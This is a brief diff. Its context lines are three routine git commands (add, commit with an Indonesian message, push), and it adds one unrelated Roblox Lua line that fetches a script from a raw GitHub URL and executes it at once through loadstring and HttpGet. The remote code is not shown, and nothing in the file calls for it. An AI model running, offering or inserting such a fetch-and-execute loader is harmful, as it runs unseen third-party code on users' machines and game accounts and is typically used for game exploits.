@@ -1,3 +1,5 @@
 git add .
 git commit -m "Menambahkan file baru"
 git push origin main
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nelayanbuntal/nelayan/refs/heads/main/main/load_eso"))()
